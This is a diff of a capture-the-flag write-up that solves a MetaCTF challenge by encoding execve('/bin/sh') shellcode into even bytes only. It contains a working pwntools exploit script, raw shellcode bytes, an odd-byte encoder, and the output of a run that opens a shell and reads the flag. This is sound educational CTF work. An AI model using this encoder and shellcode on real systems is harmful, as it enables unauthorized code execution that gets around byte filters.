@@ -194,9 +194,9 @@ I can effectively write whatever shellcode I want at this point, albeit it in a 
 
 ## Writing the Exploit:
 
-During the competition window, I manually put together each instruction in a very similar manner to that described above for the syscall. However, I have since written a helper function in an attempt to streamline the process and make it easier to encode arbitrary shellcode in this and similar fashions.
+During the competition window, I manually put together each instruction in a very similar manner to that described above for the syscall. I also designed my own binsh shellcode to include as few odd bytes as possible. However, I have since written a helper function in an attempt to streamline the process and make it easier to encode arbitrary shellcode in this and similar fashions.
 
-The basic idea is that I have two main chunks of information that I need to get into memory: the actual shellcode to set up my registers and syscall, and the '/bin/sh' string. NOPs are the byte b'\x90', which means that they are even, permissable, and can be used to pad both chunks out to predictable starting positions. I selected 0x80 and 0xf6 from the start so that I keep my shellcode contained within a single byte offset and keep things simple. I then set up an encoding function in python designed to detect each odd byte of my desired shellcode, switch it to a smaller, even byte, and place some appropriate encoding shellcode at the beginning in order to bring rax up to the byte and add one to the contents during run-time.
+The basic idea is to create an encoding function in python function to automatically scan through any provided shellcode, pick out odd bytes, switch them to smaller, even bytes, and place some appropriate encoding shellcode at the beginning in order to bring rax up to the byte and add one to the contents during run-time. I also place a padding of nops in between the end of my encoding shellcode and the beginning of my binsh shellcode in order to start the binsh shellcode at a consistent location and make the function easier to write. I could probably do without this padding if length constraints were tighter, but as it stands, I have more than enough space and it made the encoding function easier to write.
 
 This encoding function could easily deal with longer and more complicated shellcode, as long as it fits within the desired parameters. I could also optimize it further to include less unnecessary mov instructions, automatically come up with smaller NOP offsets, and more, but for the purposes of this exercise, it works really well, and it could probably be edited to work with different shellcode restrictions.
 
@@ -214,7 +214,7 @@ print(target.recvuntil(b'What is your shellcode?'))
 
 context.clear(arch='amd64')
 
-def encode(goal_shellcode, starting_position, binsh_position):
+def encode(goal_shellcode, starting_position):
 	evened_shellcode = b''
 	encoder_shellcode = b''
 	current_position = starting_position
@@ -238,18 +238,11 @@ def encode(goal_shellcode, starting_position, binsh_position):
 
 
 starting_position = 0x80
-binsh_position = 0xf6
-goal_shellcode = asm('add rdi, '+ str(binsh_position) + ''';
-xor esi, esi;
-xor rdx, rdx;
-xor rax, rax;
-mov al, 59;
-syscall;
-''') 
-goal_shellcode += asm('NOP') * (binsh_position - starting_position  - len(goal_shellcode)) + b'/bin/sh\x00'
 
-shellcode = encode(goal_shellcode, starting_position, binsh_position)
+#Credit to http://shell-storm.org/shellcode/files/shellcode-806.php for the pre-prepared binsh shellcode.
+goal_shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 
+shellcode = encode(goal_shellcode, starting_position)
 
 print(shellcode)
 print(disasm(shellcode))
@@ -260,56 +253,68 @@ target.interactive()
 ```
 And here is the output, with some of the disassembled NOPs removed for clarity:
 ```
-knittingirl@piglet:~/CTF/metaCTF21/twos_compliment$ python3 two_compliment_writeup.py
+knittingirl@piglet:~/CTF/metaCTF21/twos_compliment$ python3 two_compliment_writeup.py 
 [+] Opening connection to host1.metaproblems.com on port 5480: Done
 b'What is your shellcode?'
-b'\xb0\x80\xfe\xc0\xfe\x00\xb0\x82\xfe\x00\xb0\x86\xfe\xc0\xfe\x00\xb0\x8a\xfe\x00\xb0\x8c\xfe\xc0\xfe\x00\xb0\x90\xfe\x00\xb0\x90\xfe\xc0\xfe\x00\xb0\x92\xfe\x00\xb0\xf6\xfe\x00\xb0\xf8\xfe\x00\xb0\xfa\xfe\x00\xb0\xfa\xfe\xc0\xfe\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H\x80\xc6\xf6\x00\x00\x000\xf6H0\xd2H0\xc0\xb0:\x0e\x04\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90.bhn.rh\x00'
+b'\xb0\x80\xfe\x00\xb0\x82\xfe\xc0\xfe\x00\xb0\x84\xfe\x00\xb0\x84\xfe\xc0\xfe\x00\xb0\x86\xfe\xc0\xfe\x00\xb0\x8a\xfe\x00\xb0\x8a\xfe\xc0\xfe\x00\xb0\x8c\xfe\xc0\xfe\x00\xb0\x8e\xfe\x00\xb0\x8e\xfe\xc0\xfe\x00\xb0\x90\xfe\xc0\xfe\x00\xb0\x92\xfe\x00\xb0\x94\xfe\x00\xb0\x98\xfe\x00\xb0\x98\xfe\xc0\xfe\x00\xb0\x9a\xfe\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x900\xc0H\xba\xd0\x9c\x96\x90\xd0\x8c\x96\xfeH\xf6\xdaRT^\x98RVT^\xb0:\x0e\x04'
    0:   b0 80                   mov    al, 0x80
-   2:   fe c0                   inc    al
-   4:   fe 00                   inc    BYTE PTR [rax]
-   6:   b0 82                   mov    al, 0x82
+   2:   fe 00                   inc    BYTE PTR [rax]
+   4:   b0 82                   mov    al, 0x82
+   6:   fe c0                   inc    al
    8:   fe 00                   inc    BYTE PTR [rax]
-   a:   b0 86                   mov    al, 0x86
-   c:   fe c0                   inc    al
-   e:   fe 00                   inc    BYTE PTR [rax]
-  10:   b0 8a                   mov    al, 0x8a
+   a:   b0 84                   mov    al, 0x84
+   c:   fe 00                   inc    BYTE PTR [rax]
+   e:   b0 84                   mov    al, 0x84
+  10:   fe c0                   inc    al
   12:   fe 00                   inc    BYTE PTR [rax]
-  14:   b0 8c                   mov    al, 0x8c
+  14:   b0 86                   mov    al, 0x86
   16:   fe c0                   inc    al
   18:   fe 00                   inc    BYTE PTR [rax]
-  1a:   b0 90                   mov    al, 0x90
+  1a:   b0 8a                   mov    al, 0x8a
   1c:   fe 00                   inc    BYTE PTR [rax]
-  1e:   b0 90                   mov    al, 0x90
+  1e:   b0 8a                   mov    al, 0x8a
   20:   fe c0                   inc    al
   22:   fe 00                   inc    BYTE PTR [rax]
-  24:   b0 92                   mov    al, 0x92
-  26:   fe 00                   inc    BYTE PTR [rax]
-  28:   b0 f6                   mov    al, 0xf6
-  2a:   fe 00                   inc    BYTE PTR [rax]
-  2c:   b0 f8                   mov    al, 0xf8
-  2e:   fe 00                   inc    BYTE PTR [rax]
-  30:   b0 fa                   mov    al, 0xfa
+  24:   b0 8c                   mov    al, 0x8c
+  26:   fe c0                   inc    al
+  28:   fe 00                   inc    BYTE PTR [rax]
+  2a:   b0 8e                   mov    al, 0x8e
+  2c:   fe 00                   inc    BYTE PTR [rax]
+  2e:   b0 8e                   mov    al, 0x8e
+  30:   fe c0                   inc    al
   32:   fe 00                   inc    BYTE PTR [rax]
-  34:   b0 fa                   mov    al, 0xfa
+  34:   b0 90                   mov    al, 0x90
   36:   fe c0                   inc    al
   38:   fe 00                   inc    BYTE PTR [rax]
-  3a:   90                      nop
+  3a:   b0 92                   mov    al, 0x92
+  3c:   fe 00                   inc    BYTE PTR [rax]
+  3e:   b0 94                   mov    al, 0x94
+  40:   fe 00                   inc    BYTE PTR [rax]
+  42:   b0 98                   mov    al, 0x98
+  44:   fe 00                   inc    BYTE PTR [rax]
+  46:   b0 98                   mov    al, 0x98
+  48:   fe c0                   inc    al
+  4a:   fe 00                   inc    BYTE PTR [rax]
+  4c:   b0 9a                   mov    al, 0x9a
+  4e:   fe 00                   inc    BYTE PTR [rax]
+  50:   90                      nop
 ...
   7f:   90                      nop
-  80:   48 80 c6 f6             rex.W add sil, 0xf6
-  84:   00 00                   add    BYTE PTR [rax], al
-  86:   00 30                   add    BYTE PTR [rax], dh
-  88:   f6 48 30 d2             test   BYTE PTR [rax+0x30], 0xd2
-  8c:   48 30 c0                rex.W xor al, al
-  8f:   b0 3a                   mov    al, 0x3a
-  91:   0e                      (bad)  
-  92:   04 90                   add    al, 0x90
-  94:   90                      nop
-...
-  f5:   90                      nop
-  f6:   2e 62                   cs (bad) 
-  f8:   68 6e 2e 72 68          push   0x68722e6e
-        ...
+  80:   30 c0                   xor    al, al
+  82:   48 ba d0 9c 96 90 d0    movabs rdx, 0xfe968cd090969cd0
+  89:   8c 96 fe 
+  8c:   48 f6 da                rex.W neg dl
+  8f:   52                      push   rdx
+  90:   54                      push   rsp
+  91:   5e                      pop    rsi
+  92:   98                      cwde   
+  93:   52                      push   rdx
+  94:   56                      push   rsi
+  95:   54                      push   rsp
+  96:   5e                      pop    rsi
+  97:   b0 3a                   mov    al, 0x3a
+  99:   0e                      (bad)  
+  9a:   04                      .byte 0x4
 [*] Switching to interactive mode
 
 $ ls
@@ -318,5 +323,6 @@ two
 two.sh
 $ cat flag.txt
 MetaCTF{eVEn_evEN_8y7e5_c4N_re4cH_0Dd_Re9157eRs}
+$  
 ```
 Thanks for reading!
